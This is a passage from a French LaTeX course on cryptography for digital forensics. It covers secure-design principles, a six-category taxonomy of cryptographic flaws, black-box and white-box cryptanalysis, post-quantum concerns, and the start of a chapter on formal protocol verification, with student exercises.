          évaluée par les pairs} (comme le Trilemme CRO lui-même,
          Ch.~\ref{chap:CRO}-\ref{chap:prim-crypt}). Cette distinction
          détermine ce qui peut être affirmé avec assurance et ce
          qui doit être traité avec prudence.

    \item \textbf{Grille de lecture critique en cinq questions}
          (Tableau~29.3), transférable à \textbf{tout} protocole
          ou outil cryptographique émergent rencontré dans la
          pratique professionnelle~: statut de publication,
          documentation des primitives composantes, preuves
          formelles vs.\ affirmations qualitatives, vérifiabilité
          des scores numériques, limitations reconnues par les
          auteurs.

    \item \textbf{Application judiciaire directe}~: un expert
          appelé à témoigner sur la fiabilité d'un mécanisme
          cryptographique émergent doit appliquer cette grille
          avant toute conclusion, sous peine d'exposer son
          témoignage à une contestation fondée en
          contre-interrogatoire.

    \item Ce chapitre lui-même constitue une \textbf{application de
          sa propre leçon}~: il décrit ce qui peut être établi sur
          ZK-NR sans franchir la limite vers des affirmations non
          vérifiables, exactement la discipline exigée de tout
          rapport forensique (Ch.~\ref{chap:rapport}).
\end{itemize}
\end{boxresume}

\bigskip

\begin{boxexo}[title={\ding{45}\quad Exercice~29.1. Distinguer les statuts \niveaubase}]
Pour chacune des affirmations suivantes, indiquez si elle relève
d'un résultat \textbf{établi} (publié et vérifié), d'une
\textbf{architecture de principe} (déductible des propriétés
publiques des composants), ou d'une \textbf{affirmation non
vérifiable} en l'état des sources de ce cours~:
\begin{enumerate}[(a)]
    \item ``Les STARKs ne nécessitent pas de \textit{trusted
          setup}.''
    \item ``ZK-NR atteint un score CRO de~$0{,}88$ pour
          l'opposabilité.''
    \item ``BLS est vulnérable à l'algorithme de Shor.''
    \item ``Le modèle Tamarin de ZK-NR comporte huit règles
          symboliques et prouve six lemmes critiques.''
    \item ``Le Trilemme CRO conditionnel établit
          $\mathsf{Conf}\cdot\mathsf{Rel}\cdot\mathsf{Opp} \leq
          \Delta/\lambda + O(\lambda^{-2})$.''
\end{enumerate}
\end{boxexo}

\begin{boxexo}[title={\ding{45}\quad Exercice~29.2. Appliquer la grille de lecture \niveaumoyen}]
Une entreprise présente sur son site web un nouveau service de
``signature électronique quantique-sûre'' pour les contrats
commerciaux, sans référence à une publication scientifique, mais
avec un argumentaire technique détaillé citant ``une architecture
propriétaire combinant plusieurs couches de sécurité''.
\begin{enumerate}[(a)]
    \item Appliquez les cinq questions du Tableau~29.3 à cette
          situation. Pour chacune, formulez la question précise
          que vous poseriez à cette entreprise.
    \item En quoi cette situation diffère-t-elle, sur le plan du
          statut de vérifiabilité, du cas ZK-NR traité dans ce
          chapitre~? En quoi est-elle similaire~?
    \item Si cette entreprise sollicitait une attestation de votre
          part, en tant qu'expert, sur la fiabilité de son
          mécanisme pour un usage dans des contrats à enjeu élevé,
          quelle serait votre position, conformément à la
          discipline de ce chapitre~?
\end{enumerate}
\end{boxexo}

\begin{boxexo}[title={\ding{45}\quad Exercice~29.3. Rédiger une fiche de veille technologique \niveauexpert}]
Vous êtes chargé, au sein d'une cellule de veille technologique de
l'ANTIC, de produire une fiche de synthèse sur le protocole ZK-NR
pour informer les décideurs institutionnels camerounais, sans
exagérer ni minimiser son potentiel.
\begin{enumerate}[(a)]
    \item Rédigez une section ``Objectif et architecture'' (5--8
          lignes), en vous appuyant exclusivement sur ce qui est
          établi dans ce chapitre (Tableau~29.1), sans ajouter
          d'affirmations non sourcées.
    \item Rédigez une section ``Statut et limitations'' (5--8
          lignes), appliquant la distinction prépublication~/
          publication évaluée par les pairs
          (Section~\ref{sec:statut-prepublication}).
    \item Rédigez une section ``Pertinence pour le contexte
          camerounais'' (5--8 lignes), reliant l'objectif de
          ZK-NR aux besoins identifiés dans ce cours (chaîne de
          custody post-quantique, Ch.~\ref{chap:quantique}~;
          formation des magistrats face à des preuves
          cryptographiques complexes, Ch.~\ref{chap:bench}).
    \item Concluez par une recommandation~: à quel horizon
          temporel et sous quelles conditions ce type de protocole
          pourrait-il, selon vous, être considéré pour une
          adoption institutionnelle au Cameroun~? Justifiez en
          vous appuyant sur les régimes de capacité institutionnelle
          du Ch.~\ref{chap:prim-crypt}.
\end{enumerate}
\end{boxexo}

\bigskip

\begin{boxinfo}
\textbf{Transition.} Ce chapitre a complété la présentation du
cadre théorique de la Partie~VI en abordant directement le
protocole ZK-NR, avec la rigueur méthodologique exigée par son
statut de travail en cours. Les chapitres suivants
(Ch.~\ref{chap:cryptanal} à~\ref{chap:cas-zknr}) approfondissent
les outils de conception, de cryptanalyse et de vérification
formelle nécessaires pour, le jour où une publication complète
sur ZK-NR ou tout protocole similaire sera disponible, en conduire
vous-même l'audit rigoureux.
\end{boxinfo}
    
        % ============================================================================
% Fichier  : partie6/P06_C30_fondements_cryptanalyse.tex
% Titre    : Fondements de la Conception et Cryptanalyse
% Auteur   : MINKA MI NGUIDJOÏ Thierry Emmanuel
% Version  : 2.0 -- Juin 2026
% ============================================================================

\chapter{Fondements de la Conception et Cryptanalyse}
\label{chap:cryptanal}

\epigraph{%
    « La sécurité n'est pas un produit, mais un processus. »%
}{Bruce Schneier}

\niveauChapitre{Recherche}{%
    Cryptographie symétrique et asymétrique requises.
    Chapitres~\ref{chap:CRO} et~\ref{chap:prim-crypt} (Trilemme CRO
    formalisé et appliqué) recommandés~: ce chapitre relie la
    conception sécurisée et la cryptanalyse au cadre théorique déjà
    établi.%
}

\begin{boxobjectifs}
\begin{itemize}
    \item Maîtriser les quatre principes fondamentaux de la conception
          cryptographique sécurisée et leur justification.
    \item Relier le Trilemme CRO (Ch.~\ref{chap:CRO}) à la conception
          de protocoles~: comprendre en quoi il constitue une boussole
          de conception, pas seulement un outil d'analyse a posteriori.
    \item Classer rigoureusement les vulnérabilités cryptographiques
          selon une taxonomie à six catégories.
    \item Distinguer les modèles d'analyse \textit{black-box} et
          \textit{white-box} et savoir quand chacun s'applique.
    \item Comprendre les enjeux de la cryptanalyse post-quantique
          en lien avec le Chapitre~\ref{chap:quantique}.
    \item Adopter une posture critique et rigoureuse face aux
          publications scientifiques en cours, en distinguant
          résultat établi et prépublication non encore évaluée.
\end{itemize}
\end{boxobjectifs}

\bigskip

% ============================================================================
\section*{De l'analyse à la conception~: l'autre face du Trilemme}
% ============================================================================

Les Chapitres~\ref{chap:CRO} et~\ref{chap:prim-crypt} ont analysé
des protocoles \textbf{existants} à travers le cadre CRO~: comment
mesurer, a posteriori, le compromis confidentialité-fiabilité-
opposabilité d'Helios, d'un zk-SNARK, d'ECDSA. Ce chapitre inverse
la perspective~: comment \textbf{concevoir} un protocole en
anticipant ce compromis, et comment la \textbf{cryptanalyse},
la discipline qui teste la résistance d'un protocole à un adversaire
actif, constitue le complément indispensable de toute conception
sérieuse.

\separateur

% ============================================================================
\section{Philosophie de la Conception Sécurisée}
\label{sec:philosophie-conception}
% ============================================================================

\subsection{Quatre principes fondamentaux}

La conception de protocoles cryptographiques dignes de confiance
repose sur des principes qui anticipent délibérément la présence
d'un adversaire actif, et non simplement d'un environnement
défaillant.

\begin{boxdef}
\textbf{Devoir de méfiance} (\textit{Zero Trust})~: ne faire confiance
à aucun composant, message ou entité sans vérification préalable et
explicite. Aucune confiance implicite n'est accordée du seul fait
qu'un acteur se trouve ``à l'intérieur'' d'un périmètre supposé sûr.

\textbf{Minimalisme}~: réduire la surface d'attaque au strict
nécessaire. Toute fonctionnalité, tout code, toute complexité
supplémentaire constitue une opportunité additionnelle pour
l'attaquant, principe directement lié à la réduction de
$H(\Sigma)$ (Ch.~\ref{chap:CRO}), l'entropie de l'espace des preuves.

\textbf{Défense en profondeur}~: empiler plusieurs mécanismes de
sécurité indépendants, de sorte que la compromission d'une seule
couche n'entraîne pas l'effondrement de l'ensemble du système.

\textbf{\textit{Fail-safe defaults}}~: un système doit refuser
l'accès par défaut~; l'autorisation n'est accordée qu'explicitement,
après vérification réussie, jamais l'inverse.
\end{boxdef}

\begin{boxCRO}
\textbf{Analyse CRO. Les quatre principes relus à travers le
cadre formalisé}

Ces quatre principes, bien antérieurs à la formalisation du Trilemme
CRO, peuvent désormais être relus avec les outils des
Chapitres~\ref{chap:CRO} et~\ref{chap:prim-crypt}~:

Le \textbf{minimalisme} agit directement sur $H(\Sigma)$~: moins de
complexité signifie un espace de preuves plus restreint, donc
potentiellement plus facile à interpréter institutionnellement
(rappelons la borne~$\mathsf{Opp} \leq H(C)/H(V\mid C)$ du
Théorème~2, Ch.~\ref{chap:CRO}, où un espace de preuves trop riche
nuit à l'opposabilité si le contexte $H(C)$ ne suit pas).

La \textbf{défense en profondeur} est, formellement, une instance
de l'architecture en couches (Gold-Iron-Clay, Ch.~\ref{chap:CRO})~:
chaque couche apporte une force dominante distincte plutôt que de
chercher une primitive unique optimisant simultanément les trois
dimensions, ce que le théorème d'impossibilité interdit.

\cro{$\sim$ selon couche}{$\uparrow$ via minimalisme}{$\uparrow$ via espace de preuves restreint}
\end{boxCRO}

\subsection{Le Trilemme CRO comme boussole de conception}

Le Chapitre~\ref{chap:CRO} a établi, avec preuve mathématique
publiée, qu'\textbf{aucune construction ne peut maximiser
simultanément confidentialité, fiabilité et opposabilité} au-delà
d'un certain seuil conjoint (Théorème~3). Cette impossibilité n'est pas
une fatalité paralysante pour la conception, elle en est, au
contraire, la \textbf{boussole}~: une conception sécurisée ne
cherche pas l'optimum impossible, mais l'\textbf{équilibre
le mieux adapté au cas d'usage}, en suivant la méthode de sélection
de protocole établie au Ch.~\ref{chap:prim-crypt}
(Section~\ref{sec:implications-conception-prim})~: évaluer la
capacité institutionnelle cible, identifier le régime correspondant,
choisir l'architecture en conséquence.

\begin{boiteRemarque}{Sur les travaux de l'auteur en cours de
publication~: protocole ZK-NR}
Au-delà du cadre CRO (Ch.~\ref{chap:CRO}-\ref{chap:prim-crypt}),
l'auteur de ce cours développe, dans le cadre de travaux
de~recherche en cours, un protocole nommé \textit{ZK-NR}~\cite{minka2025zknr}
(\textit{Zero-Knowledge Non-Repudiation}), visant à combiner
plusieurs primitives (engagements de Merkle, preuves de type
STARK, signatures à seuil, signatures post-quantiques) pour des
scénarios de non-répudiation à forte criticité, une application
directe de la logique de défense en profondeur de ce chapitre.

\textbf{Statut à la date de rédaction de ce cours}~: contrairement
au cadre CRO (Ch.~\ref{chap:CRO}-\ref{chap:prim-crypt}), publié et
évalué par les pairs dans IEEE Access, le protocole ZK-NR ne fait
pas, à ce stade, l'objet d'un article complet disponible pour
vérification dans le cadre de ce cours. Conformément à la rigueur
méthodologique appliquée tout au long de cette Partie~VI, ce
chapitre s'abstient donc de présenter des détails techniques
(architecture précise, preuves de sécurité, scores de performance)
qui ne pourraient être vérifiés contre une publication accessible.
\textbf{Ce qui peut être affirmé en toute rigueur}~: le projet
illustre, par sa conception même (combinaison de primitives aux
forces complémentaires), le principe de défense en profondeur
appliqué à la non-répudiation, une instanciation conceptuelle
légitime à mentionner, indépendamment de la disponibilité d'un
article finalisé.
\end{boiteRemarque}

% ============================================================================
\section{Taxonomie des Failles Cryptographiques}
\label{sec:taxonomie-failles}
% ============================================================================

Comprendre l'attaquant nécessite de catégoriser systématiquement
ses vecteurs d'attaque possibles. Cette taxonomie, standard en
cryptographie, structure toute analyse de sécurité rigoureuse.

\begin{tableaucours}{p{3.5cm}p{7.5cm}}{%
    \tableauHeader{Type de faille} &
    \tableauHeader{Description et exemples}
}
\textbf{Conceptuelle (modèle)} & Faille dans la spécification
    formelle du protocole. L'attaquant respecte scrupuleusement
    le protocole tel que défini, mais en exploite une faiblesse
    logique. \textit{Exemple~:} attaque par rejeu de session,
    absence de protection contre la répétition
    (\textit{replay protection}). \\
\textbf{D'implémentation} & Faille dans le code source, malgré une
    spécification formelle correcte. \textit{Exemple~:} fuite de
    mémoire, gestion erronée des cas d'erreur, attaques par mesure
    de temps d'exécution (\textit{timing attacks}). \\
\textbf{Passive (écoute)} & L'adversaire observe uniquement, sans
    altérer la communication. \textit{Exemple~:} analyse de trafic
    (Ch.~\ref{chap:for-res}), cryptanalyse du texte chiffré
    intercepté. \\
\textbf{Active (modification)} & L'adversaire altère activement la
    communication. \textit{Exemple~:} attaque de l'homme du milieu
    (\textit{man-in-the-middle}), injection de messages forgés. \\
\textbf{Contre les primitives} & Attaque visant directement le
    fondement mathématique de la primitive. \textit{Exemple~:}
    algorithme de Shor contre RSA/ECC (Ch.~\ref{chap:quantique}),
    attaque par canal auxiliaire (consommation électrique,
    rayonnement électromagnétique) sur une implémentation ECC. \\
\textbf{Contre le protocole} & Attaque exploitant l'interaction
    entre plusieurs primitives correctement implémentées
    individuellement. \textit{Exemple~:} attaque par entrelacement
    (\textit{interleaving}) entre deux sessions, confusion des
    rôles entre prouveur et vérificateur. \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}{\small\itshape Tableau~30.1. Taxonomie des failles
de sécurité cryptographique}\end{center}

\begin{boxscenario}{Application de la taxonomie~: l'affaire MVOM
revisitée}
Reprenons l'analyse de l'Opération MVOM (Ch.~\ref{chap:for-sys},
\ref{chap:for-res}) à travers cette taxonomie~:

\begin{itemize}
    \item L'\textbf{accès SSH par force brute} relève d'une faille
          \textbf{active}~: l'attaquant ne se contente pas
          d'observer, il tente activement des authentifications.
    \item L'utilisation du \textbf{chiffrement BitLocker} sur le
          disque saisi, si elle avait été contournée par une faille
          dans l'implémentation Windows plutôt que par obtention
          légale de la clé, aurait relevé d'une faille
          \textbf{d'implémentation}, distincte d'une attaque
          \textbf{contre la primitive} AES elle-même
          (Ch.~\ref{chap:quantique}~: AES reste robuste face aux
          capacités actuelles).
    \item La \textbf{tentative \texttt{StopLogging}}
          (Ch.~\ref{chap:anti-for}) n'exploite aucune faille
          cryptographique~: elle relève d'une catégorie distincte,
          hors taxonomie cryptographique stricte, mais analogue
          conceptuellement à une faille \textbf{conceptuelle}~: le
          système de logging n'anticipait pas, dans sa conception
          initiale, qu'un attaquant disposant de privilèges
          administrateur chercherait à désactiver l'audit
          lui-même.
\end{itemize}
\end{boxscenario}

% ============================================================================
\section{Introduction à la Cryptanalyse}
\label{sec:intro-cryptanalyse}
% ============================================================================

\subsection{Objet et finalité}

\begin{boxdef}
\textbf{Cryptanalyse}~: discipline scientifique consistant à
étudier et tenter de contourner les mécanismes de protection
cryptographique d'un système. Son objectif \textbf{n'est pas
exclusivement offensif}~: elle est indispensable à la validation
de la solidité des constructions, exactement comme la falsification
active (E9bis du PIU, Ch.~6~(UE~SEC4031)) est indispensable à la
validation d'une hypothèse investigative, une hypothèse, ou un
protocole, qui n'a jamais été sérieusement attaqué n'a pas démontré
sa robustesse~; il n'a simplement pas encore été testé.
\end{boxdef}

Cette analogie entre cryptanalyse et falsification active n'est pas
fortuite~: les deux disciplines partagent une même épistémologie
poppérienne, la confiance se construit par résistance répétée
à des tentatives sérieuses de réfutation, pas par l'absence de
telles tentatives.

\subsection{Approches \textit{black-box} et \textit{white-box}}

\begin{boxdef}
\textbf{Analyse \textit{black-box}}~: l'attaquant ne dispose que
des entrées et sorties observables du système. Il déduit les
vulnérabilités potentielles par observation du comportement
externe, temps de réponse, consommation énergétique, messages
d'erreur.

\textbf{Analyse \textit{white-box}}~: l'attaquant dispose d'un
accès total à l'implémentation, au code source, voire aux données
internes en cours d'exécution. C'est le scénario le plus
défavorable pour le défenseur, et le standard d'évaluation pour
tout système fortement exposé.
\end{boxdef}

\begin{tableaucours}{p{2.8cm}p{4.0cm}p{4.5cm}}{%
    \tableauHeader{Modèle} &
    \tableauHeader{Information disponible} &
    \tableauHeader{Pertinence forensique (ce cours)}
}
\textit{Black-box} & Entrées/sorties observables uniquement &
    Analyse réseau (Ch.~\ref{chap:for-res})~: l'investigateur,
    face à un trafic chiffré inconnu, raisonne en \textit{black-box}, métadonnées, motifs de connexion, sans accès au contenu \\
\textit{White-box} & Code source, mémoire, état interne complet &
    Analyse de firmware (Ch.~\ref{chap:for-iot}, Binwalk)~:
    l'investigateur dispose d'un accès total au binaire extrait,
    scénario \textit{white-box} par excellence \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}{\small\itshape Tableau~30.2. Les deux modèles
appliqués à la pratique forensique de ce cours}\end{center}

\begin{boiteRemarque}{Le principe de Kerckhoffs, fondement du
modèle white-box}
L'adoption du modèle \textit{white-box} comme standard d'évaluation
en cryptographie moderne découle directement du \textbf{principe de
Kerckhoffs} (1883)~: la sécurité d'un système cryptographique doit
reposer uniquement sur le secret de la clé, jamais sur le secret
de l'algorithme. Un protocole dont la sécurité dépendrait de la
confidentialité de sa conception échouerait, par construction,
face à un adversaire \textit{white-box}, exactement le cas
d'un firmware d'appareil IoT analysé après extraction
(Ch.~\ref{chap:for-iot}), où l'algorithme complet est accessible
à l'investigateur (et potentiellement à l'attaquant qui aurait
pu l'extraire de la même façon).
\end{boiteRemarque}

% ============================================================================
\section{Cryptanalyse Post-Quantique~: Anticiper Deux Horizons Temporels}
\label{sec:cryptanalyse-pq}
% ============================================================================

Le Chapitre~\ref{chap:quantique} a détaillé les algorithmes de Shor
et Grover et leurs implications pour les preuves numériques. Cette
section les replace dans le cadre plus large de la
\textbf{méthodologie cryptanalytique}~: une analyse de sécurité
moderne ne peut plus se limiter à un seul horizon temporel.

\begin{enumerate}
    \item \textbf{Aujourd'hui}~: résistance aux attaques classiques
          sur les capacités de calcul actuellement disponibles, l'horizon d'analyse traditionnel de la cryptanalyse.
    \item \textbf{Demain}~: résistance aux attaques quantiques,
          notamment via les algorithmes de \textbf{Shor} (rupture
          de la cryptographie asymétrique) et de \textbf{Grover}
          (accélération quadratique réduisant la sécurité effective
          des clés symétriques), horizon détaillé au
          Ch.~\ref{chap:quantique}, Sections~1 et~3.
\end{enumerate}

\begin{boxCRO}
\textbf{Analyse CRO. ``Harvest Now, Decrypt Later'' comme
problème cryptanalytique prospectif}

La stratégie \textit{Harvest Now, Decrypt Later}
(Ch.~\ref{chap:quantique}, section~26.2) transforme la cryptanalyse
d'une discipline rétrospective (``ce protocole est-il cassé~?'')
en discipline \textbf{prospective} (``ce protocole sera-t-il
cassé, et quand~?''), rendant la cryptanalyse prospective
absolument critique pour la protection des secrets à très longue
durée de sensibilité, exactement comme établi au
Ch.~\ref{chap:quantique} pour les données de santé ou les
secrets d'État.

$\mathcal{C}$~: cette stratégie inverse la temporalité habituelle
de l'analyse de risque, la confidentialité d'aujourd'hui dépend
d'une cryptanalyse qui n'existe pas encore.

$\mathcal{R}$~: aucune méthode de cryptanalyse actuelle ne peut
\textbf{prouver} la résistance future d'un protocole~; elle ne peut
que documenter l'absence de faille connue \emph{à ce jour}, une
limite épistémologique fondamentale, déjà signalée au
Ch.~\ref{chap:quantique} concernant les calendriers spéculatifs.

\cro{$\downarrow\downarrow$ pour données longue durée}{$\sim$ limite épistémologique assumée}{$\sim$}
\end{boxCRO}

% ============================================================================
\section{De la Cryptanalyse à la Conception~: une Boucle Vertueuse}
\label{sec:boucle-vertueuse}
% ============================================================================

\subsection{Le cycle conception-cryptanalyse-révision}

La pratique mature de la cryptographie institutionnelle, telle
qu'elle ressort des Chapitres~\ref{chap:CRO} et~\ref{chap:prim-crypt},
suit un cycle itératif~:

\begin{enumerate}
    \item \textbf{Concevoir} un protocole en appliquant les quatre
          principes de la Section~\ref{sec:philosophie-conception}
          et en explicitant, dès la conception, le régime de
          capacité institutionnelle visé (Ch.~\ref{chap:prim-crypt}).
    \item \textbf{Soumettre} le protocole à une cryptanalyse
          rigoureuse, \textit{white-box} de préférence
          (Section~\ref{sec:intro-cryptanalyse}), analogue à la
          revue par les pairs qui a validé les Théorèmes~1 à~3 du
          Ch.~\ref{chap:CRO} avant publication.
    \item \textbf{Documenter} les failles découvertes selon la
          taxonomie de la Section~\ref{sec:taxonomie-failles}, en
          distinguant leur catégorie précise.
    \item \textbf{Réviser} la conception en réponse, en
          réévaluant le positionnement CRO du protocole révisé
          (méthode du Ch.~\ref{chap:prim-crypt}).
    \item \textbf{Republier} ou redéployer, avec une documentation
          transparente du processus, exactement la posture de
          transparence méthodologique pratiquée par les auteurs
          du cadre CRO eux-mêmes, qui identifient explicitement
          les limites et pistes futures de leur propre travail.
\end{enumerate}

\subsection{Application au contexte forensique}

\begin{boxjuris}
\textbf{Cryptanalyse et admissibilité en droit camerounais}

Un expert judiciaire camerounais (Ch.~12~(UE~SEC4031), experts
agréés Décret~69/DF/544) appelé à témoigner sur la solidité d'un
mécanisme cryptographique utilisé dans un dossier, par exemple,
la robustesse d'une signature électronique contestée
(Ch.~11~(UE~SEC4031), eIDAS), doit être en mesure de
répondre, en contre-interrogatoire (Ch.~\ref{chap:rapport}), à des
questions de cryptanalyse~: \textit{``Cet algorithme a-t-il fait
l'objet d'une cryptanalyse publiée~? A-t-il résisté aux meilleures
tentatives de la communauté scientifique~? Existe-t-il des attaques
connues, même théoriques, contre cette construction~?''} La
réponse attendue, conforme à la rigueur de ce chapitre, distingue
toujours~: ce qui est \textbf{publié et vérifié} (par exemple, les
théorèmes du Ch.~\ref{chap:CRO}), ce qui relève d'une
\textbf{recherche en cours} non encore validée par les pairs (par
exemple, le protocole ZK-NR évoqué en
Section~\ref{sec:philosophie-conception}), et ce qui demeure une
\textbf{question ouverte}.
\end{boxjuris}

\separateur

\begin{boxresume}
\textbf{Ce qu'il faut retenir de ce chapitre~:}
\begin{itemize}
    \item \textbf{Quatre principes de conception}~: Zero Trust,
          minimalisme, défense en profondeur, \textit{fail-safe
          defaults}, chacun directement reliable au cadre CRO
          formalisé (Ch.~\ref{chap:CRO}).

    \item Le \textbf{Trilemme CRO} fonctionne comme \textbf{boussole
          de conception}, pas seulement comme outil d'analyse a
          posteriori~: il guide le choix d'architecture vers
          l'équilibre adapté au régime de capacité institutionnelle
          cible (Ch.~\ref{chap:prim-crypt}).

    \item \textbf{Taxonomie en six catégories}~: failles
          conceptuelles, d'implémentation, passives, actives,
          contre les primitives, contre le protocole, grille
          systématique applicable à toute analyse de sécurité,
          y compris en contexte forensique.

    \item \textbf{Black-box vs white-box}~: deux modèles d'analyse
          directement transposables à la pratique forensique de ce
          cours (analyse réseau~$\approx$ black-box~; analyse de
          firmware~$\approx$ white-box), enracinés dans le principe
          de Kerckhoffs.

    \item \textbf{Cryptanalyse post-quantique}~: deux horizons
          temporels à anticiper simultanément (aujourd'hui/demain),
          avec la stratégie \textit{Harvest Now, Decrypt Later}
          transformant la cryptanalyse en discipline prospective
          (Ch.~\ref{chap:quantique}).

    \item \textbf{Cycle vertueux conception-cryptanalyse-révision}~:
          la pratique mature ne sépare pas concevoir et attaquer~;
          elle les itère, avec une documentation transparente
          à chaque étape.

    \item \textbf{Rigueur sur les travaux en cours}~: la distinction
          entre résultat publié et évalué par les pairs (Trilemme
          CRO), prépublication non encore évaluée par les pairs (ZK-NR), et
          question ouverte, est elle-même une compétence
          cryptanalytique et forensique, appliquée explicitement
          dans ce chapitre à propos des propres travaux de l'auteur.
\end{itemize}
\end{boxresume}

\bigskip

\begin{boxexo}[title={\ding{45}\quad Exercice~30.1. Application de la taxonomie \niveaubase}]
Pour chacune des situations suivantes, rencontrées dans ce cours,
classez la faille selon la taxonomie du Tableau~30.1 (une ou
plusieurs catégories peuvent s'appliquer, justifiez)~:
\begin{enumerate}[(a)]
    \item Un attaquant intercepte du trafic réseau chiffré sans
          le modifier, dans l'espoir de le déchiffrer plus tard
          (Ch.~\ref{chap:quantique}, \textit{Harvest Now, Decrypt
          Later}).
    \item Un développeur laisse une clé API en clair dans une
          couche Docker, supprimée dans une couche ultérieure mais
          toujours accessible dans l'historique
          (Ch.~\ref{chap:containers}).
    \item Un attaquant exploite l'algorithme de Shor contre une
          signature RSA (Ch.~\ref{chap:quantique}).
    \item Un acteur malveillant intercale ses propres messages
          dans un échange SSH déjà établi.
\end{enumerate}
\end{boxexo}

\begin{boxexo}[title={\ding{45}\quad Exercice~30.2. Conception sous contrainte CRO \niveaumoyen}]
Vous devez concevoir un mécanisme de signature pour les rapports
d'expertise forensique numérique au Cameroun (Ch.~\ref{chap:rapport}),
destiné à être présenté devant des tribunaux de juridiction
générale ($H(C) \approx 8$~bits selon le Ch.~\ref{chap:prim-crypt}).
\begin{enumerate}[(a)]
    \item En appliquant la méthode de sélection de protocole
          (Ch.~\ref{chap:prim-crypt}, section~28.8.1), dans quel
          régime de capacité institutionnelle ce contexte se
          situe-t-il~? Quel type de protocole (transparent ou
          préservant la confidentialité) recommanderiez-vous~?
    \item Appliquez les quatre principes de conception
          (Section~\ref{sec:philosophie-conception}) à ce
          mécanisme~: que signifierait concrètement le
          ``minimalisme'' pour une signature de rapport d'expertise~?
    \item Quelle catégorie de faille (Tableau~30.1) vous semble la
          plus critique à anticiper pour ce cas d'usage spécifique~?
          Justifiez et proposez une contre-mesure de conception.
\end{enumerate}
\end{boxexo}

\begin{boxexo}[title={\ding{45}\quad Exercice~30.3. Esprit critique face à un protocole en développement \niveauexpert}]
Un consortium international vous présente un nouveau protocole de
non-répudiation pour la chaîne de custody numérique, accompagné
d'une présentation affirmant~: ``Notre protocole atteint
simultanément confidentialité~$=0{,}95$, fiabilité~$=0{,}98$ et
opposabilité~$=0{,}92$, soit un score combiné de~$0{,}857$, le
plus élevé jamais documenté.''
\begin{enumerate}[(a)]
    \item En vous appuyant sur le Théorème~3 (Trilemme CRO
          conditionnel, Ch.~\ref{chap:CRO}) et sur les valeurs
          réellement publiées du Tableau~28.3 (Ch.~\ref{chap:prim-crypt},
          produits CLO entre~$0{,}27$ et~$0{,}57$), évaluez la
          plausibilité de cette affirmation.
    \item Quelles questions précises poseriez-vous à ce consortium
          pour vérifier la validité de ces chiffres (référez-vous
          à la méthodologie en quatre étapes du
          Ch.~\ref{chap:prim-crypt}, section~28.1)~?
    \item Ce chapitre a traité le protocole ZK-NR, mentionné dans
          le Prologue de ce cours, avec une prudence méthodologique
          explicite face à l'absence d'article complet vérifiable.
          Rédigez un court paragraphe expliquant pourquoi cette
          même prudence devrait s'appliquer à l'affirmation du
          consortium de cet exercice, en distinguant ce qui
          relèverait d'un résultat publié et évalué par les pairs
          de ce qui relève d'une affirmation commerciale non
          vérifiée.
\end{enumerate}
\end{boxexo}

\bigskip

\begin{boxinfo}
\textbf{Transition.} Ce chapitre clôt l'exploration de la
conception et de la cryptanalyse fondées sur le cadre CRO. Le
chapitre suivant aborde la \textbf{méthodologie d'analyse formelle}~:
comment structurer rigoureusement une preuve de sécurité, et
comment cette même rigueur méthodologique s'applique à la rédaction
des preuves forensiques présentées tout au long de ce cours.
\end{boxinfo}
    
        % ============================================================================
% Fichier  : partie6/P06_C31_methodologie_formelle.tex
% Titre    : Méthodologie d'Analyse Formelle de Protocoles
% Auteur   : MINKA MI NGUIDJOÏ Thierry Emmanuel
% Version  : 2.0 -- Juin 2026
% ============================================================================

\chapter{Méthodologie d'Analyse Formelle de Protocoles}
\label{chap:form-meth}

\epigraph{%
    « Sans modélisation formelle, la sécurité n'est qu'une illusion de
    confiance. »%
}{Andrew Yao}

\niveauChapitre{Recherche}{%
    Logique formelle de base recommandée. Chapitre~\ref{chap:cryptanal}
    (cryptanalyse) indispensable~: ce chapitre formalise et outille
    la démarche cryptanalytique qui y a été présentée.%
}

\begin{boxobjectifs}
\begin{itemize}
    \item Maîtriser le modèle de menace Dolev-Yao~\cite{dolevyao1983}~: ses hypothèses,
          sa portée, et pourquoi il reste le standard de l'analyse
          de protocoles malgré ses limites assumées.
    \item Formaliser des propriétés de sécurité (non-répudiation,
          confidentialité, authenticité, intégrité) sous forme de
          lemmes vérifiables.
    \item Comprendre les principes de fonctionnement et les usages
          respectifs de Tamarin Prover, ProVerif et CryptoVerif.
    \item Appliquer une méthodologie d'audit en cinq étapes,
          combinant analyse manuelle et vérification automatisée.
    \item Interpréter correctement un résultat ``non prouvé'' rendu
          par un outil de vérification formelle~: distinguer
          limitation outil et faille réelle.
    \item Relier la vérification formelle de protocoles à la
          méthodologie de rédaction de rapport forensique
          (Ch.~\ref{chap:rapport})~: même exigence de rigueur,
          même distinction entre ce qui est prouvé et ce qui ne
          l'est pas.
\end{itemize}
\end{boxobjectifs}

\bigskip

% ============================================================================
\section*{De la cryptanalyse informelle à la preuve formelle}
% ============================================================================

Le Chapitre~\ref{chap:cryptanal} a présenté la cryptanalyse comme
discipline de test adverse, indispensable au même titre que la
falsification active du PIU (E9bis, Ch.~6~(UE~SEC4031)). Mais
``tester un protocole'' et ``prouver qu'il résiste à toute attaque
dans un modèle donné'' sont deux démarches de nature différente~:
la première est empirique et jamais exhaustive~; la seconde, quand
elle aboutit, offre une garantie mathématique au sein des hypothèses
posées. Ce chapitre présente la méthodologie et les outils qui
permettent de passer de l'une à l'autre.

\separateur

% ============================================================================
\section{Modélisation des Menaces}
\label{sec:modelisation-menaces}
% ============================================================================

Toute analyse formelle commence par la définition précise de la
puissance et des objectifs de l'adversaire considéré. Sans cette
définition explicite, affirmer qu'un protocole est ``sûr'' n'a
aucun sens vérifiable, sûr contre quel adversaire, capable de
quoi~?

\subsection{Le modèle Dolev-Yao}

\begin{boxdef}
\textbf{Modèle Dolev-Yao}~(1983)~: modèle standard pour l'analyse
formelle des protocoles cryptographiques. Il pose que l'attaquant~:
\begin{itemize}
    \item \textbf{contrôle entièrement le réseau}~: il peut écouter,
          bloquer, injecter et modifier n'importe quel message en
          transit~;
    \item \textbf{est un participant légitime}~: il possède les
          clés publiques attendues et peut engager des sessions
          comme n'importe quel acteur honnête~;
    \item \textbf{ne peut pas casser les primitives cryptographiques
          par la force}~: le chiffrement, les signatures et les
          fonctions de hachage sont traités comme des
          \textbf{boîtes noires parfaites} (modèle de l'oracle), 
          un message chiffré est totalement opaque sans la clé,
          une signature ne peut être forgée sans la clé privée.
\end{itemize}
\end{boxdef}

\begin{boxalert}
\textbf{Pourquoi cette séparation des préoccupations est une force,
pas une faiblesse}

